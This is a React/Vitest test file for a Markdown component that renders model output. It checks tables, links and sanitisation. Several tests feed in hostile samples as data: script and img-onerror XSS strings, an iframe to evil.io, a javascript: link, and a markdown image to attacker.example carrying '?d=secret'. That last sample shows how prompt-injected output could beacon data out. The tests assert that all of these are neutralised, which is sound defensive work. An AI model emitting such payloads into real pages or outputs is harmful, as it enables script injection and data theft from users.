import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { Markdown } from './Markdown'

describe('Markdown', () => {
  it('renders GitHub-flavoured markdown with scrollable tables', () => {
    const { container } = render(<Markdown className="extra">{'**BTC** is up.\n\n| asset | 24h |\n|---|---|\n| BTC | +2% |\n\n- one\n- ~~two~~'}</Markdown>)
    expect(container.firstChild).toHaveClass('md', 'extra')
    expect(screen.getByText('BTC', { selector: 'strong' })).toBeInTheDocument()
    expect(container.querySelector('.md-table > table')).not.toBeNull()
    expect(screen.getByRole('cell', { name: '+2%' })).toBeInTheDocument()
    expect(container.querySelector('del')).toHaveTextContent('two')
  })

  it('marks a table wider than its column, until it is scrolled to the end', () => {
    vi.stubGlobal('ResizeObserver', class { observe() {} disconnect() {} })
    vi.spyOn(Element.prototype, 'scrollWidth', 'get').mockReturnValue(600)
    vi.spyOn(Element.prototype, 'clientWidth', 'get').mockReturnValue(343)
    const left = vi.spyOn(Element.prototype, 'scrollLeft', 'get').mockReturnValue(0)
    const { container } = render(<Markdown>{'| a | b | c |\n|---|---|---|\n| 1 | 2 | 3 |'}</Markdown>)
    const box = container.querySelector('.md-table')!
    expect(box).toHaveAttribute('data-overflow')
    left.mockReturnValue(257)
    fireEvent.scroll(box)
    expect(box).not.toHaveAttribute('data-overflow')
  })

  it('opens links in a new tab without an opener', () => {
    render(<Markdown>{'[Reuters](https://reuters.com/x)'}</Markdown>)
    const link = screen.getByRole('link', { name: 'Reuters' })
    expect(link).toHaveAttribute('href', 'https://reuters.com/x')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('never renders raw HTML from model output', () => {
    const { container } = render(
      <Markdown>{'Hi <script>window.pwned = 1</script> <img src=x onerror="window.pwned=1"> <iframe src="https://evil.io"></iframe> <b>bold?</b>'}</Markdown>,
    )
    expect(container.querySelector('script, img, iframe, b, [onerror]')).toBeNull()
    expect(container).toHaveTextContent('<script>window.pwned = 1</script>') // shown as inert text
    expect((window as { pwned?: number }).pwned).toBeUndefined()
  })

  it('never renders markdown images, so injected output cannot beacon data out', () => {
    const src = 'https://attacker.example/p.png?d=secret'
    const { container } = render(<Markdown>{`Answer.\n\n![](${src})\n\n![alt][r]\n\n[r]: ${src}`}</Markdown>)
    expect(container).toHaveTextContent('Answer.')
    expect(container.querySelector('img')).toBeNull()
    expect(document.querySelector(`[href*="attacker.example"], [src*="attacker.example"]`)).toBeNull() // no <img>, no preload <link>
  })

  it('drops javascript: URLs from links', () => {
    render(<Markdown>{'[click](javascript:alert(1))'}</Markdown>)
    expect(screen.getByText('click').getAttribute('href') ?? '').not.toContain('javascript')
  })
})
